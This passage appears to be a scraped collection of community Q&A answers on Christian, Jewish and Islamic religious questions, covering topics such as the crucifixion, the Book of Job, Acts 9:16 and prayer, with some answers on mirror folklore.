cross on the ground while they nailed his hands and feet to it with great spikes. The cross was then lifted and dropped into a hole in the ground. The entire weight of the body tore at the spikes, and the pain was almost beyond endurance. The blood began to pound through the body as the shock of what was happening began to take its toll. As the cells of the body were broken down it became a living death that sometimes lasted for a few hours, and could even last for a few days. Since Jesus had been whipped before they took Him to be crucified, He was already weak from loss of blood. Mercifully, He lived only a few hours on the cross.        Even with all the pain, Jesus thought of others rather than Himself. His first words from the cross were, "Father, forgive them for they know not what they do". Even though He could have threatened to punish them eternally when they faced Him in judgement, he did not do so. He thought of His mother, who stood by the cross weeping, and asked his beloved friend John to take care of her. On either side of Him there were two thieves crucified with Him. When one of them expressed faith in Jesus, the Saviour answered, "Today shalt thou be with me in paradise". As the terrible afternoon wore on and His pain increased he finally moaned, "I thirst", and was offered vinegar, which He would not drink. God blotted out the sun as if to let us know how black the deed which was being done, and out of that blackness Jesus cried, "My God, My God, why hast Thou forsaken me?". His final words expressed his complete surrender to the will of God as He said, "It is finished; Father into Thy hands I commend my spirit". He then bowed His head and died.     Even the earth could not accept the death of its Creator and Master without showing grief. There was a great earthquake which shook the countryside and made all people afraid. The only fear which we need to have, however, is that of refusing the love He showed in dying for us. The theme of our lives ought to be, "I'll live for Him who died for me, how happy then my soul shall be. I'll live for Him who died for me, my Saviour and my God".       God Bless|`|AA10578359	If God is there, He has given you a choice.  If you choose to live a life against his rules, then YOU'VE chosen to go to Hell, He has not chosen to send you there.

He realizes that he did a really bad job of making people and so when we mess up he gets really mad.  He stomps around and makes lightning and damns us to hell.    If he didn't do this all the other gods would laugh at him (since he made people that don't really work right).  The other gods said... stop... you don't know what your doing... you need more time (6 days is not enough time to make a decent universe!).    They were right.  Now he has all these people he doesn't know what to do with.  They all have souls so he can't just kill them all (well... not anymore... you know... rainbow and all).

PSkHc7h6aa	Psa 37 is an Acrostic Psalm.    It holds a promise.    Psalm 37.  In this Psalm the series is perfect and complete.  Every letter has two verses of two lines each, except three :  vv. 7 (d, Daleth = D), 20 (k, Kaph = K), and 34 (q, Koph = K).     Read these  vs together.    Psa 37:7 Rest in the LORD, and wait patiently for him: fret not thyself because of him who prospereth in his way, because of the man who bringeth wicked devices to pass.     Psa 37:20 But the wicked shall perish, and the enemies of the LORD [shall be] as the fat of lambs: they shall consume; into smoke shall they consume away.     Psa 37:34 Wait on the LORD, and keep his way, and he shall exalt thee to inherit the land: when the wicked are cut off, thou shalt see [it].

X9rXRNUxaa	For eminent sufferings (Act_9:16): I will show him how great things he must suffer for my name's sake. He that has been a persecutor shall be himself persecuted. Christ's showing him this intimates either his bringing him to these trials (as Psa_60:3), Thou hast shown thy people hard things, or his giving notice of them beforehand, that they might be no surprise to him. Note, Those that bear Christ's name must expect to bear the cross for his name; and those that do most for Christ are often called out to suffer most for him. Saul must suffer great things. This, one would think, was a cold comfort for a young convert; but it is only like telling a soldier of a bold and brave spirit, when he is enlisted, that he shall take the field, and enter upon action, shortly. Saul's sufferings for Christ shall redound so much to the honour of Christ and the service of the church, shall be so balanced with spiritual comforts and recompensed with eternal glories, that it is no discouragement to him to be told how great things he must suffer for Christ's name's sake.    May God bless you as you study His Word    |`|rTplTuEdaa	It,s to show our faith is real to God.|`|nIu8zVkXaa	The word suffer here in this verse is the Greek word for experience.  The verse says, "For I will shew him how great things he must suffer (experience) for my name's sake."  Paul not only experienced heartache, loneliness, persecution, starvation, beatings, stoning, and imprisonment, he also experienced the joy and peace of seeing the kingdom of God expanded and souls being saved through the Gospel of Jesus Christ.  He also experienced, I believe, love far greater than any of us can imagine not only from the Lord but from the churches that he helped to get started.      In this verse, the context is one of showing or allowing Paul to experience all these things in the service to Jesus Christ.|`|XJKLel5Jaa	I believe we suffer to help us be compassionate to others who suffer. To help us understand what they are going through. To TRULY understand. I found an excellent commentary to this passage (Acts 9:16). I have included an excerpt and the link, and the link itself. I hope it is helpful to you. I love your questions.    What follows is the excerpt from the commentary I found:    Immediately Jesus issues a divine demand that requires Saul's trust and obedience. In the city he will learn what he must do to fulfill God's purposes (compare 9:16; 14:22).    Saul's companions probably include a number of wayfarers banded together in a caravan for protection against the hazards of the journey, as well as temple police to aid Saul in his work (Lake and Cadbury 1979:101; Bruce 1988:185). At this encounter they stand speechless, hearing a voice or the sound of a voice but not understanding the words (9:7/22:9). They do not see Jesus, though they see the light (22:9).    Thus Saul's conversion experience is an objective event with third-party witnesses. It is also a very personal event. The witnesses do not participate in the theophany the way Saul does (compare Jn 12:29-30; Acts 7:56).    For Saul the physical effects are devastating. Getting up from the ground, he opens his eyes and discovers he is blind! Led by the hand (Judg 16:26; Tobit 11:16) into the city, he neither eats nor drinks for three days.    But the spiritual effects on Saul will last a lifetime. The spiritual significance of a Jewish rabbi's being physically blinded by the light of the glory of God in the face of Jesus Christ is not lost on Saul or Luke (2 Cor 4:4-6). Major themes in Luke-Acts are God's final salvation as a recovery of sight to the blind and as a light to the nations (Is 40:5/Lk 3:6; Is 61:1-2/Lk 4:18-19; Is 42:6/Lk 2:30-32; Is 49:6/Acts 13:47; compare 26:23; Lk 7:21-22; 18:35-43--last miracle before the cross; 14:21; Acts 26:18-23; Hamm 1990:68). The Jews, especially the rabbis, used the image "guide to the blind" to describe their God-given role among the Gentiles and the am haares (1 Enoch 105:1; Sibylline Oracles 3:194; Josephus Against Apion 2.41; Rom 2:19). As Saul meditates on the light during those three days of darkness, then, the greatness of the divinely promised final salvation available only in the last person he saw must become more and more clear and precious (Acts 26:18). And the role he is to play in becoming a light to the Gentiles must become increasingly evident (26:17).    What is Saul to make of his blindness? It is not a punishment (as Hamm 1990:70) nor an indication of divine disfavor (as Hedrick 1981:419) nor simply a concrete proof of the vision (as Haenchen 1971:323). An acted parable, it shows Saul the spiritual bankruptcy of his pre-Christian condition.    Saul's fast may be caused by the shock. Eye doctor John Bullock notes that the electrical shock from being struck by lightning causes violent muscular contractions; the throat can be so affected that it is hard to swallow (see notes for 9:8, 18). Or the fast may be a conscious act of penance for past sins (Haenchen 1971:323). The former seems more likely, since in 9:19, after his healing, Saul takes nourishment and is strengthened.    All conversion experiences are unique to the individual. What of Saul's experience does Luke intend us to take as normative? We should focus on the dynamic pattern of conversion, which includes a personal encounter with Jesus Christ via a witness to the gospel, a response of surrender in penitence and faith, and the reception of salvation blessings and incorporation into the church.Saul the Chosen Vessel (9:10-19)|`|db7df25ea31227e5641d5c32d43c3bcdaa	probably that is what God had in mind|`|97oxJ0B8aa	Yeah, sounds right to me.

John 15:   16Ye have not chosen me, but I have chosen you, and ordained you, that ye should go and bring forth fruit, and that your fruit should remain: that whatsoever ye shall ask of the Father in my name, he may give it you.      17These things I command you, that ye love one another.      18If the world hate you, ye know that it hated me before it hated you.      19If ye were of the world, the world would love his own: but because ye are not of the world, but I have chosen you out of the world, therefore the world hateth you.      20Remember the word that I said unto you, The servant is not greater than his lord. If they have persecuted me, they will also persecute you; if they have kept my saying, they will keep yours also.      21But all these things will they do unto you for my name's sake, because they know not him that sent me.      22If I had not come and spoken unto them, they had not had sin: but now they have no cloak for their sin.      23He that hateth me hateth my Father also.      24If I had not done among them the works which none other man did, they had not had sin: but now have they both seen and hated both me and my Father.     1 John 3:7-19    7Little children, let no man deceive you: he that doeth righteousness is righteous, even as he is righteous.      8He that committeth sin is of the devil; for the devil sinneth from the beginning. For this purpose the Son of God was manifested, that he might destroy the works of the devil.      9Whosoever is born of God doth not commit sin; for his seed remaineth in him: and he cannot sin, because he is born of God.      10In this the children of God are manifest, and the children of the devil: whosoever doeth not righteousness is not of God, neither he that loveth not his brother.      11For this is the message that ye heard from the beginning, that we should love one another.      12Not as Cain, who was of that wicked one, and slew his brother. And wherefore slew he him? Because his own works were evil, and his brother's righteous.      13Marvel not, my brethren, if the world hate you.      14We know that we have passed from death unto life, because we love the brethren. He that loveth not his brother abideth in death.      15Whosoever hateth his brother is a murderer: and ye know that no murderer hath eternal life abiding in him.      16Hereby perceive we the love of God, because he laid down his life for us: and we ought to lay down our lives for the brethren.      17But whoso hath this world's good, and seeth his brother have need, and shutteth up his bowels of compassion from him, how dwelleth the love of God in him?      18My little children, let us not love in word, neither in tongue; but in deed and in truth.      19And hereby we know that we are of the truth, and shall assure our hearts before him.

Here David recognizes himself a sinner needing a Saviour, but most Christians nowadays think that they are pure in their own eyes, but have never been cleansed from their filthiness.    Even King David recognized that if you still have sin then God will never hear your prayers (Isaiah 59:2), but ony the prayers of a righteous man.    To become a righteous person you must seek God and His righteousness, and this can be found once you find the narrow way.

i0Ydiqj2aa	Is it possible to read the New Testament as a mythological book that teaches moral values? To believe that Jesus wasn't the son of God, but was just a man that taught us good moral values. Is it possible to believe that hell doesn't exist and that we shouldn't take the New Testament literally.    Seriously, if you want to try and make a valid point about how it's ok to read the Torah out of context, that just won't work.    If you're a Christian, which by the sounds of your question, you are, then you will believe that the New Testament should be read a certain way, that you can't just take it any old way, but there is a right way of understanding it. That is literally, as opposed to allegorically.    So if you as a Christian believe there is only one right way of reading the New Testament, how about you let the Jews read their Bible the way that they hold is the correct and proper way too.    Seriously, have some respect.    Unless you're willing to say you can read the New Testament can be interpreted any way at all. That Jesus may have been a reincarnated Budda, and that truth is 100% relative, that there are no absolutes, then don't go around trying to tear away other people's absolute faith.    How would you feel if people went around misreading your holy book? Don't do to others, what you would not have them do to you.    Old Tradition is something both Christians and Jews have.  In fact, the Talmud was only written because their respected "pastors" were being murdered by the Romans and they were worried they were going to lose their understanding so they wrote it down, even though they believe it the understanding should be discipled from person to person and not just learnt from a book.    Christians have their own oral law. There are the all sorts of laws Christians have which aren't in the Bible, but they follow them anyway, and obviously they don't have a problem with not being sola scriptura. I've never met a person claiming to be sola scriptura who has not had some belief or law which is not in the Bible.    Seriously, respect.|`|8179167c86c2a954054ffc06276ae83caa	it is a fallible work of man, same as the catechism, the watchtower, doctrines and covenants etc. all men have an agenda, you can't rely on them. let god be your guide, not man.|`|yvRD6nDgaa	Yes i personally believe so.|`|N8wutNoLaa	absolutely.     i beleive it was meant to be, speaking from a christian standpoint.|`|evStsOQiaa	Yes it is possible because I have and that is how I interpreted the pages and pages of scientific text out of it that has been mistranslated into religious text.|`|TEtOq1XCaa	Of course.

You may want to extend your question until tomorrow for more informative answers on the subject.     To answer:    Taking theology verbatim, leaves little breathing room for real definition and understanding. Like linguistics, religion can be seen as progressive if applied correctly.      When you look at a body of water and just assume its' depth, you will only end up with an estimation.  In order to examine the actual depth, you would use various tools to do so. The same is true for Torah in Judaism.      The Talmud is a tool that explores wording, statements, texts and recorded discussions.  It helps Jewish people define how commandments are applied, what scenarios exist for exceptions and how they are interminable in both historical and contemporary society.    One could take the literal approach reading wise, but that leaves little gray area for discussion.  In essence it misses the point of ontological topics and dismisses them. You would be giving an estimation of water depth here, not the literal variant.     The Talmud is fairly old in itself, so if you take a historical standpoint: It would be important to examine.|`|AA10613962	This is one of the most intelligent questions I have seen here today!

69750f25faea5e6021c54c23d0dcb774aa	Do you really think that Job was better off after having his family all killed?  So...he got a new family.  Is that how you would feel if your children were all killed over a bet with Satan?  You people are really crazy.  If your god did exist, I wouldn't want any part of him.  He is a monster.  And yes I do have the right to expect an all powerful god to follow the rules that he gave men to live by.  If he can't keep them, how in hell are we supposed to?|`|lh2H5oSOaa	God is Just. He never punishes anyone without fault. In all probablity, Job made some mistake due to which God decided to give him a trial.  I do not know specifically about him, but God tried Jacob because once he failed to help a hungry man who had fasted. So he had to live without his son, like which was not born before, for almost 30 years.    God knows everything but he has made a system. Everyone will be tried to prove his sincerity and truthfulness and the more one is closer to Him, more severe and trying the trial is.                                                         Muhammad Javed Iqbal|`|AA10116612	God knew what Job was made of.  He knew Job could do it.    It was a story to prove a point to us.|`|0a35bd8efe64caf91fcf1e0cf5d79e07aa	It sounds like you did not read the entire story. He is God. He can do whatever He wants. Job came through it with more blessing than he ever could have imagined. He was probably happy with the deal. God bless.|`|xbw8P3Rsaa	Well, He didn't.     I just finished re-reading Job this week. =)    Sure, that is the opening to Job, but once you get to the end you will see this is suffering was also an opportunity for Job to get to know God better.  This can be seen in the end of the book where God speaks to Him.    Eventually we will all find that the sufferings of this world are stinging immunization shots to prepare us for the next; and it will be totally worth it.|`|KmnbjZIdaa	We have a mistaken notion that there are things that we deserve from God, like He should not make us suffer for whatever reason.  The truth is that a mere creation cannot make demands against his Creator.  The life that God gives us is an undeserved gift already and we are not justified to ask for anything else.|`|UD7d70awaa	God comes before anything.|`|6lJuKKMHaa	He is proving the Point to mankind, not satan!!  |`|UXuGCgo3aa	To give us an example of unshakeable faith, perhaps, or to give Job's friends forgiveness.

ridu0Rtwaa	Just try reading a small sample of BAD Christian postings on here!!!    Intolerant, egotistical, hate filled and bigoted!! Eschewing education, science, evolution works of fiction and much, much more. Christians are the only religion opposing human rights and persecuting gays, pro choice and so much more - but far worse whilst they demand freedom of religion they deny it to all non Christians and persecute them!!!    GOOD christians are far more likely to thumbs down or even violate such posts than any other religion or atheists!!    Christianity is being destroyed from within by the fundies!!|`|dd7de1dd375fcb6afffc282f17c117c6aa	Well, there are people who claim to be "Christians," but their behavior does not reflect Christian principles.  There are people who do not claim to be "Christians," but their behavior suggests they are more Christ-like than the so-called Christians.  So, a less spiritual vote would be a vote of ignorance, not necessarily non-Christian.|`|xbw8P3Rsaa	No.  Sometimes the non-Christian can be a better leader.  Sometimes Christians are darn right goofy and another person is better for the job.      The truths of Christianity are universal.  It is not that all religions preach the same truth, but the knowledge of how to live a somewhat moral life and how to run a good government is not limited to Christianity.    I would pick an moral and honest atheist over some of the knuckle headed Christian presidents we have had.|`|09ef400ecd1475bf913602053ad3f68aaa	If we vote it is usually for the lesser of the two evils. Republicans are conservative yet the rich and powerful  thrive, the poor get poorer and war and death toll create   economic prosperity to some. Democrats care for the rights of the poor, care for the disadvantaged, help the middle class folk, strive for peace... but are more liberal in ideals and humans rights.    How a person lives is what matters, not how they vote.|`|ffb16e0ffc6a4152dbf3d94c25cd5995aa	No. It means that the "Christian" candidate is not walking in God's ways.|`|4acef5ace8722980d0dcb0fc7f33bdd9aa	In my opinion, no, it just means that person has voted for the best person that has ran for the job.  In this day in time, we don't always have a Christian, better Christian, the best Christian vs. another.  Our recent election is proof of that!!  And besides who are "we" to make that judgement on anothers' Christian beliefs.  In my opinion, only God our Father can truly make that determination.|`|ePMLU3Vmaa	it means they're more into politics than religion probably|`|0bcc67423b49c29e8f5efc50ba271e60aa	Render unto Ceaser that which is Caeser's.

UXuGCgo3aa	Because we want to blame our problems on anyone but ourselves, and people want to make God seem unjust when problems are simply a part of being human.

It's the same way even with people. When someone does something good, we often don't seem to notice it. However, when someone does something that has bad results, we dump the blame on that person.  When it is done in public, it's mostly for show. And the daily exclamations of 'O my God' are just that... daily and routine ways of individuals.   alejandra, good answer:)
DEpH7w4vaa	Yes, I do notice an obvious bias. I guess we all have the tendency to view things from our own point of view.    However, God exists outside of our limited lives and He is good, holy, perfect. If you read the WHOLE book you will see the God of the Old Testament and the God of the New Testament are equally good and loving.|`|XSh0u9Kwaa	Mat 10:34  "Do not think that I came to bring peace on the earth; I did not come to bring peace, but a sword.

Luke 13:28  "There will be weeping and gnashing of teeth there when you see Abraham and Isaac and Jacob and all the prophets in the kingdom of God, but yourselves being cast out.    Rev 20:15  And if anyone's name was not found written in the book of life, he was thrown into the lake of fire.    Rev 9:6  And in those days men will seek death and will not find it; and they will long to die and death flees from them.      From the OT God, who is the same as the NT:    Ezek 18:21  "But if the wicked man turns from all his sins which he has committed and observes all My statutes and practices justice and righteousness, he shall surely live; he shall not die.  Ezek 18:22  "All his transgressions which he has committed will not be remembered against him; because of his righteousness which he has practiced, he will live.  Ezek 18:23  "Do I have any pleasure in the death of the wicked," declares the Lord GOD, "rather than that he should turn from his ways and live?|`|hIuWPD3xaa	What I have noticed is that many people who are both good AND well-informed have problems with the god of the Old Testament (and Paul), which they don't have with Jesus. I once saw a bumper that read :               "Jesus was a liberal,             but GOD is conservative!"  That would summarize my own  view perfectly, if it were REVERSED.              "GOD is conservative,            but Jesus was a liberal!"    You see, Conservatives designed their bumper sticker in order to address the problem that they have with Jesus, namely, his teaching and example is sooooo Liberal.  Conservatives may call themselves "Christians" but that's clearly an example of the sin of "using (Christ's) name in vain".  Just notice whom Conservative preachers and writers constantly quote. It's Paul and the Old Testament, not Jesus of Nazareth. (But Jesus is so much more loved in the world at large, so they use HIS name on their bottle of Paul's doctrines.)  To see why they prefer Paul's teaching, see http://LiberalsLikeChrist.Org/Paulvsall.... .   To see how liberal Jesus was, and the reason Conservative "Christians" don't relate to him, see http://LiberalsLikeChrist.Org/Christlike... .    As for people like  LeslieAnn, who says   "God is good, holy, perfect. If you read the WHOLE book you will see the God of the Old Testament and the God of the New Testament are equally good and loving." and cites as "Source"  37 years of experiences with the God of the Bible and my Savior, Jesus Christ!,  as a 72 old Christian, who has been a serious student of the bible all my life and a Christian minister almost as long, I have read the WHOLE book and found the very OPPOSITE that you have, and I have published a web page designed to persuade Christians AND Jews to differentiate between the "good god" in the Bible from the "horrible god"  : see http://www.WhatKindofGod.org .|`|OuvATYw3aa	Yes, it make you think that they have something against Him|`|aBHY2iXraa	The rough, tough OT God performs a few good deeds in the NT and we're supposed to be impressed?    It's like the mafia dons committing crimes all year and then throwing a free party for the underprivileged (and expecting us to regard them as "good fellas" for having done so).|`|ViZH5twNaa	Credit for what?! Jesus supposedly curing a few sick people he just happened to trip over? That would hardly make up for the 2 million kill count he racked up in the OT.    Hitler killed millions of people, if he he helped a few old ladies across the street as a youth does that make up for it?    *edit*  If I build a robot that kills millions of people and develop diseases that kill billions can I make up for that? God supposedly created everything, that includes all the horrors you seem to be ignoring.    *edit*  "Hitler did not love his people, he loved only himself. Hitler did not send His son to die for anyone."    1) You don't know what Hitler thought, no one does.    2) God didn't sacrifice his only son, Jesus was Him. On top of that Jesus didn't die. He was resurrected and crowned ruler of the universe.|`|jg5Ii27Vaa	right, people like to focus on the bad and not the good. it causes more drama and people flock to drama like flies to honey.

I must say that I never was bitter toward atheists.  They, like any other group, can be rather enjoyable, as long as they are not bitter.  Why, then, shall we consider all of them our enemies?  Because they do not believe as we do?  That seems the best answer, though perhaps the one we are least eager to hear or admit.    We need to love all of them (we were instructed to), and try to make peace rather than insult them because of their rejection of our doctrines.

Edit: here is also a reference if u want to read it.    2  Evidence that when a woman leads other women in prayer, she should stand in the middle of the row.      Ibn Qudaamah said: it is Sunnah, when a woman to lead other women in prayer, for her to stand in the middle of the row in all cases, because they are awrah. Al-Mughni, vol. 1, p. 347     Al-Nawawi said: The Sunnah is for a woman who is leading other women in prayer to stand in the middle of the row, because of the reports which state that Aaishah and Umm Salamah led other women and they stood in the midst of them. Al-Majmoo Sharh al-Muhadhdab, vol. 4, p. 192     If women pray in congregation, then the one who is leading them should stand in the middle of the row, because that is more concealing, and a woman is required to cover as much as possible. It is known that if a woman stands in the midst of other women it is more concealing than if she were to stand in front of them. The evidence for that is the reports which were narrated from Aaishah and Umm Salamah (may Allaah be pleased with them), When a woman leads other women in prayer, she should stand in the middle of them. This was the action of the Sahaabi women, and the more correct view is that this action of the Sahaabi women is to be taken as proof because there is no text narrated to the contrary. If a woman is leading one other woman in prayer, she should stand as a man stands with one other man.     See al-Sharh al-Mumti by Ibn Uthaymeen, vol. 4, p. 387     http://islamqa.com/en/ref/12451/women%20...|`|IbtQ5IKNaa	Just behind or to the woman's side of course.|`|XTUg4Uk8aa	on their feet with their shoes off and facing west|`|A5HPUGxraa	when you lead and you are two you stand on the left to your sister    when you lead and it is a group you stand in the middle    good luck with your prayers please remember us in your prayers :)|`|mYqfr0fIaa	you stay together...unless you lead so the two go back of you and pray|`|88fHI3xDaa	when u stand prayer urb sister will be back on u like when a imam recite prayer and all follower stand back in  imam if u are two man u stand with eachother if u are three man a person should be imam if a man and woman will stand for salah if they are bros sis or hus wife woman will stand back it is the way of sunnah if u want to confirm u can read sahih Bukhari and Muslim

I guess it comes down to having given our "family" names, they have become our pets, just as our cats and dogs, and I would not concede to eat them!    As to the usage of parentheses:  As you have done yourself.  I believe it is a kind of afterthought, but necessary.  There, I am trying to be clever (?).
UrNMuhFKaa	Maybe it is answering your question. I am not sure I have ever done anything even once that was purely good or selfless.  Humanity has the potential for both good and evil. Sometimes I am amazed at all the good that happens around me every day. Mothers caring for their children with very little thanks, elementary teachers who get paid but not enough, friends who give up their time and possessions to help a friend. Even driving down the road a person let me in today when he could of sped up and cut me off.   I am sorry this has been a such a hard week for you.|`|hjxsX4liaa	Hello  : )  ~  Maybe you could try looking at it like this:    Humans are selfish animals,  we care primarily about ourselves,  and our family and friend's   (This is evolutionary, if we did   not care about our family,   we would let our children   die and the species would   have died out, and we need   friend's and family or we   would go insane, etc.).   So there is nothing to   be expected of us,   no reason for us to   look after anyone   except us and our's,   but, we have charities,   and rescue helicopters,   and law enforcement,   and sometimes, if you   have you're hand's full,   someone that you   have never met   might hold open a door for you!   How wonderfull is that?   People have no   reason to care   about stranger's,   but we do! Every day!   Even other species,   which we have no   reason to care about   what so ever.    Selfish is the human default, so see that as neutral. Anything that is not selfish is above and beyond. Pure, shiny wonderfulness  : )    Sorry that is so long, hope it helped you some  : )    Peace  : )|`|qCtbizzPaa	I donated my time at a battered women's shelter and kept several clients out of jail.|`|XlhR7ooHaa	went to school    rode my bike    did a ****    mowed the lawn    bought a chain    why the hell do you want to know what i did?|`|5a066f23730087641ff3d156e7a2b41faa	That's our species name.  The word humane was conceived to describe human behavior.  Do you feel like you aren't humane, do you assume everyone is evil and you're one of the only good ones.  Believe me, there are a ton of wonderful people in the world.  Some just do what they are told and think they are doing good (iraq war).      Something nice I did?  Well, I scratched my husbands back and I work and take care of my children.  Some people have very busy lives and in this economy they need to work a lot to get by and support their families.  I pay taxes and I'm polite.  I also support programs that help people take care of their family.    http://en.wikipedia.org/wiki/Human  http://en.wikipedia.org/wiki/Humane

bRLCxmP6aa	The "fight of modern women for equal rights" is a fight to decide how they want to live their own lives.     It is up to these individuals, not to you or to anyone else, how they should dress or behave. If a woman wants to wear saris, go to the temple, or be a homemaker, then she should be able to do so. If she doesn't, no one should be able to force her into that life. If she wants to wear a bikini or skirts or shorts, if she wants to dance and drink and party, if she wants to be sexually liberated, then she should be free to choose that life.     Women are equal to men - and as equals, they must be in charge of their own lives and free to make their own decisions, both good or bad. You may not like what you see "modern" women doing, but your values are your business and their values are theirs. Free people are free to make bad decisions (like choosing to start smoking) as well as good ones.

Bloody Mary is actually the term that was coined about Queen Mary of England who began the Catholic inquisition in England and eventually died after a terrible reign, and her half sister Queen Elizabeth began her rule.

Bloody Marry can appear outside the mirror.|`|c1q3lWtlaa	if you say candy man in the mirror three times, tony todd will come out with a hook-hand and take you to cabrini green, the projectist project of them all.|`|8k6kxOh2aa	have you ever tried the candyman?    Later on, at a friends slumber party, I heard the story of Candyman. Like I said, I was never one for scary movies, but this one intrigued me. It follows a similar story to the Bloody Mary game. The story went that a freed-slave turned artist had an affair with a white mans daughter. He had his hand chopped off, dipped in honey, and then he was stung to death by bees. Thats messed up enough as it is. Well, apparently if you stood in front of a mirror and said Candyman a couple of times he would appear behind you and kill you with his hook hand. I think at that point I ducked into my sleeping bag and didnt want to come back up, and I certainly didnt want to end up anywhere close to a mirror.     For centuries mirrors have been part of stories about witches and demons and such. Theyve been used for divination, and it was claimed that mirrors could be used to see into secret worlds and reveal things that couldnt be seen by the human eye. Despite the fact that we no longer technically believe in witches and warlocks mirrors are still a little weird, especially to kids. Thats why these stories are still around. Its the same reason that lakes and rivers have stories associated with them: they have depths that we cant see. Watch a little kid look at a mirror for the first time, especially a free standing one. They will look at the front, then try and reach into it and grab the things they see, then they will look at the back and try and find out where the things they see inside the mirror are. That first weird encounter with a mirror never really seems to go away.     These days, whenever I get a little creeped out I only go into my bathroom under great duress. It contains the only mirror in my house. There is nothing worse than already being a little jumpy and then catching some movement in the mirror. Im sure that nothing is moving, but sometimes I see a face that isnt actually there, or I can see something moving out the opaque window. Its enough to make a man turn on all his lights and sit in his living room watching SportsCenter until entirely sure that no crazed serial killer was going to kill him and wear him as a dress. Assuming, of course, that the man is me.         or the headless horseman one?  if you say the headless horseman's names a couple time with your eyes colosed or something. he's supposed to rush by and you get the feeling that your head has been cut off|`|lc9nus8taa	well i've heard this candy man one
iQZpv42raa	No, not praying at all would be better habit|`|6WQo6RpSaa	I've wondered the same thing....I figured that he thought of prayers the way parents think of their kids giving them a hug before they go to school every day or saying good-night before going to bed every night....I guess it probably hurts a little bit when it doesn't happen, but sometimes we forget or we get caught up in our busy lives and don't feel like we have time, or something. Just try your best, and I'm sure he would be understanding if you should happen to skip a day every now and then.

2b5799147194d19d72182c8e2216fa41aa	Since when did you start putting limits and boundaries on answers? ha ha just joking with you. I would love to share something I was considering today, I was reading in the fourth chapter of Exodus where the Lord was speaking to Moses , I am going to post some of the verses:    Exodus 4: 2 And the LORD said unto him, What is that in thine hand? And he said, A rod.   3 And he said, Cast it on the ground. And he cast it on the ground, and it became a serpent; and Moses fled from before it.   4 And the LORD said unto Moses, Put forth thine hand, and take it by the tail. And he put forth his hand, and caught it, and it became a rod in his hand:     I'm going to skip down a few verses:     15 And thou shalt speak unto him, and put words in his mouth: and I will be with thy mouth, and with his mouth, and will teach you what ye shall do.   16 And he shall be thy spokesman unto the people: and he shall be, even he shall be to thee instead of a mouth, and thou shalt be to him instead of God.   17 And thou shalt take this rod in thine hand, wherewith thou shalt do signs.    18 And Moses went and returned to Jethro his father in law, and said unto him, Let me go, I pray thee, and return unto my brethren which are in Egypt, and see whether they be yet alive. And Jethro said to Moses, Go in peace.   19 And the LORD said unto Moses in Midian, Go, return into Egypt: for all the men are dead which sought thy life.   20 And Moses took his wife and his sons, and set them upon an ***, and he returned to the land of Egypt: and Moses took the rod of God in his hand.     I love that at the first when the Lord asked Moses what was in his hand, Moses replied " a rod " but after the Lord had spoken to him,  called him, and showed him these wonders, when Moses was leaving to go to Egypt it was now " the rod of God ". That is such a blessing to me, when we have an encounter with God not only are we changed, but He changes our abilities, resources,( which are from the Lord, our sufficiency is of Him and not of ourselves ) and even takes the things that we have and makes them better. ( relationships, gifts, talents, etc. )  Moses was once holding just " a rod " but left with " the rod of God ", I hope that we can see ourselves as an extension of the Lord, a willing vessel to be used by Him, and an instrument in the Lord's hands, we are not just people, but " the Lord's people ".    May God give us all the knowledge of His will in all wisdom and spiritual understanding, in Jesus precious name. Amen.  with much love and sincerity in Christ my Lord,  andrew|`|9dd2ac44728dd565acf459d4a4e730d0aa	2 Cor 10 v. 4-5: "The weapons we fight with are not the weapons of the world.

We demolish arguments and every pretension that sets itself up against the knowledge of God, and we take captive every thought to make it obedient to Christ."    A famous English novelist, E.M.

So, how much more will our  Father in heaven give good things to us  when we  ask Him!" Hence, My prayer is Eph. 3:17, that we all would be rooted and grounded in His love! That we would understand the length, width, depth and height! To know the love that surpasses ALL understanding! God bless you Sandy.:)|`|xbw8P3Rsaa	Sandy,     I had a prayer answered today.  For a long time I have complained (not necessarily prayed) about a social problem I have.

Over the last two days, I have been reading a book on prayer, "Beginning to Pray," by Russian Archbishop Anthony Bloom.  Trying to pray as he taught, I brought up this issue.      God's response was that these annoying people are an opportunity for me to grow to see them as God sees these children of his and to grow closer to them.

By observing the memorial of the creation of the world in six days and the rest of the Creator on the seventh day , by keeping the Sabbath holy, according to His directions, the Israelites were to declare to the world their loyalty to the only true and living God, the Sovereign of the universe.|`|r8rykCkGaa	Thanks for the wonderful Scripture.  I have been following the schedule in Reinhard Bonnke's devotional, "Mark My Word."  We read Psalm, Prov. and Matthew now and I'm behind in the Genesis part---they just started Exodus lately but I have tons of Christian literature and read some of that each day also.  So, yes, it's Ps. 25, Prov. 6 and Matt. 21 now.  Just read the part about Jesus in the temple and drying up the fig tree and then telling his disciples that they can move mountains if they have faith, and cast them into the sea.  (That passage is also in Mark 11:22-24 in a more detailed form and one I quote from often).  Thanks for asking.  God bless you immensely!!!|`|AA10057370	The whole bible.

Where does the encouragement take you?    Go to the book of James . . . what does he say, over & over, about faith without resultant action - true faith moves one to REALLY follow Jesus, who went out door-to-door, city-to-city teaching the good new of the Kingdom & making God's name known. Without action, faith is dead, says James (Jesus half brother & son of Mary & Joseph)|`|pakIAYWoaa	hi you ; great question one that we should ask ourselves everyday and share the answer with those around us..today i ponder 2 cor 10 3..for though we walk in the flesh, we do not war according to the flesh.  For the weapons of our warfare are not carnal but mighty in God for pulling down strongholds,casting down arguments and every high thing that exalts itself against the knowledge of God, bringing every thought into  captivity and the obedience of Christ.        Gods ways are so much better than our own; i am below God and He is reaching down to my level to try to bring me up to His and give my selfish heart a loving outlook and the care to continue the work of reconciliation for those who dont know the Lord.  Your question is wonderful, encouraging, hope filled and I am thankful to be encouraged by your entry today...God bless you too!

I suffer from pride myself.

sDNTMAkmaa	Everyone will sin in their life. The original sin is not the sin that holds us down. We hold ourselves down by sinning.  Romans 3   23 For all have sinned, and come short of the glory of God;|`|8c0d15366f972f0fe93e20c73c8bda50aa	There is no human on earth that does not sin - not even the Pope. We are all human; imperfect beings lured by the dellusion of become God-like and perfect. It will never happen.     But I would like to point out a fact that I don't believe in "sin" in the christian way. I believe in right and wrong that is not tied to religion at all - call it a code of ethics.|`|aYY9dPVJaa	Yes, except Jesus Christ. We are all born with sin-nature, and without the Spirit of God (except John the Baptist). Sin is anything that does not emanate from a heart of faith (or believing). We need Christ to restore our lives to having a relationship with God.|`|AgTyP7swaa	every body are sinners   but the ques is   who defines wat is sin and wat is not   is it written in books &we are blindly following them my point is sin has is unique defination for every individual  .............|`|OdTLUprzaa	Yeah, sooner or later, everyone will sin.  If we didn't we wouldn't need God, right?  Sin means "missing the target" pretty much, or missing what God wants for us.  So it goes beyond just murder and robbery, like you were getting at.  No one could just choose not to do it. We don't know how long Eve was in the 